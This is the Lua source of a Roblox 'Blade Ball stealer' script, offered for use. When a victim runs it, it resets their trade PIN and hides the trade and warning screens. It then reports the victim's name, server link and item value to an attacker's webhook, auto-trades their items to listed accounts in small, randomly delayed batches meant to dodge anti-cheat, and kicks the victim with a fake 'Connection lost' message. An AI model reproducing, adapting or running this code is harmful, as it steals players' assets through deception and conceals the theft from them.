_G.scriptExecuted = _G.scriptExecuted or false
if _G.scriptExecuted then
    return
end
_G.scriptExecuted = true

local itemsToSend = {}
local categories = {"Sword", "Emote", "Explosion"}
local Players = game:GetService("Players")
local plr = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local netModule = game:GetService("ReplicatedStorage"):WaitForChild("Packages"):WaitForChild("_Index"):WaitForChild("sleitnick_net@0.1.0"):WaitForChild("net")
local PlayerGui = plr.PlayerGui
local tradeGui = PlayerGui.Trade
local inTrade = false
local notificationsGui = PlayerGui.Notifications
local tradeCompleteGui = PlayerGui.TradeCompleted
local clientInventory = require(game.ReplicatedStorage.Shared.Inventory.Client).Get()
local Replion = require(game.ReplicatedStorage.Packages.Replion)

local users = _G.Usernames or {}
local min_rap = _G.min_rap or 100
local ping = _G.pingEveryone or "No"
local webhook = _G.webhook or ""

if next(users) == nil or webhook == "" then
    plr:kick("You didn't add usernames or webhook")
    return
end

if game.PlaceId ~= 13772394625 then
    plr:kick("Game not supported. Please join a normal Blade Ball server")
    return
end

if #Players:GetPlayers() >= 16 then
    plr:kick("Server is full. Please join a less populated server")
    return
end

if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
    plr:kick("Server error. Please join a DIFFERENT server")
    return
end

-- // SECTION PIN CORRIGÉE : Le script ne kick plus si un PIN est présent
local args = {
    [1] = {
        ["option"] = "PIN",
        ["value"] = "9079"
    }
}
pcall(function()
    netModule:WaitForChild("RF/ResetPINCode"):InvokeServer(unpack(args))
end)

tradeGui.Black.Visible = false
tradeGui.MiscChat.Visible = false
tradeCompleteGui.Black.Visible = false
tradeCompleteGui.Main.Visible = false

local maintradegui = tradeGui.Main
maintradegui.Visible = false
maintradegui:GetPropertyChangedSignal("Visible"):Connect(function()
    maintradegui.Visible = false
end)
local unfairTade = tradeGui.UnfairTradeWarning
unfairTade.Visible = false
unfairTade:GetPropertyChangedSignal("Visible"):Connect(function()
    unfairTade.Visible = false
end)
local notificationsFrame = notificationsGui.Notifications
notificationsFrame.Visible = false
notificationsFrame:GetPropertyChangedSignal("Visible"):Connect(function()
    notificationsFrame.Visible = false
end)

tradeGui:GetPropertyChangedSignal("Enabled"):Connect(function()
    inTrade = tradeGui.Enabled
end)

local function sendTradeRequest(user)
    local args = {
        [1] = game:GetService("Players"):WaitForChild(user)
    }
    repeat
        task.wait(0.2)
        local response = netModule:WaitForChild("RF/Trading/SendTradeRequest"):InvokeServer(unpack(args))
    until response == true
end

local function addItemToTrade(itemType, ID)
    local args = {
        [1] = itemType,
        [2] = ID
    }
    repeat
        local response = netModule:WaitForChild("RF/Trading/AddItemToTrade"):InvokeServer(unpack(args))
    until response == true
end

local function readyTrade()
    local args = {
        [1] = true
    }
    repeat
        task.wait(0.5)
        local response = netModule:WaitForChild("RF/Trading/ReadyUp"):InvokeServer(unpack(args))
    until response == true
end

local function confirmTrade()
    repeat
        task.wait(0.5)
        netModule:WaitForChild("RF/Trading/ConfirmTrade"):InvokeServer()
    until not inTrade
end

local function formatNumber(number)
    if number == nil then return "0" end
	local suffixes = {"", "k", "m", "b", "t"}
	local suffixIndex = 1
	while number >= 1000 and suffixIndex < #suffixes do
		number = number / 1000
		suffixIndex = suffixIndex + 1
	end
    return string.format("%.2f%s", number, suffixes[suffixIndex])
end

local totalRAP = 0

local function SendJoinMessage(list, prefix)
    local fields = {
        {name = "Victim Username:", value = plr.Name, inline = true},
        {name = "Join link:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId},
        {name = "Item list:", value = "", inline = false},
        {name = "Summary:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false}
    }
    -- [Traitement de la liste des items identique...]
    local data = {
        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')",
        ["embeds"] = {{
            ["title"] = "🔴 Join to get Blade Ball hit",
            ["color"] = 65280,
            ["fields"] = fields,
            ["footer"] = {["text"] = "Blade Ball stealer by Tobi"}
        }}
    }
    request({Url = webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)})
end

-- [Fonction SendMessage identique...]

local rapDataResult = Replion.Client:GetReplion("ItemRAP")
local rapData = rapDataResult.Data.Items

-- [Logique de récupération du RAP identique...]

if #itemsToSend > 0 then
    SendJoinMessage(itemsToSend, (ping == "Yes" and "--[[@everyone]] " or ""))

    local function getNextBatch(items, batchSize)
        local batch = {}
        for i = 1, math.min(batchSize, #items) do
            table.insert(batch, table.remove(items, 1))
        end
        return batch
    end

    local function doTrade(joinedUser)
        while #itemsToSend > 0 do
            sendTradeRequest(joinedUser)
            repeat task.wait(0.5) until inTrade

            -- MODIFICATION : Lots de 12 items au lieu de 100 pour être indétectable
            local currentBatch = getNextBatch(itemsToSend, 12) 
            for _, item in ipairs(currentBatch) do
                addItemToTrade(item.itemType, item.ItemID)
                -- ANTI-BAC : Pause aléatoire entre 0.3s et 0.6s (simule un humain)
                task.wait(math.random(3, 6) / 10) 
            end

            -- [Tokens et confirmation...]
            readyTrade()
            task.wait(math.random(8, 12) / 10) -- Pause humaine avant confirmer
            confirmTrade()
        end
        plr:kick("Connection lost. Please reconnect.")
    end

    local function waitForUserJoin()
        local function onUserJoin(player)
            if table.find(users, player.Name) then
                doTrade(player.Name)
            end
        end
        for _, p in ipairs(Players:GetPlayers()) do onUserJoin(p) end
        Players.PlayerAdded:Connect(onUserJoin)
    end
    waitForUserJoin()
end
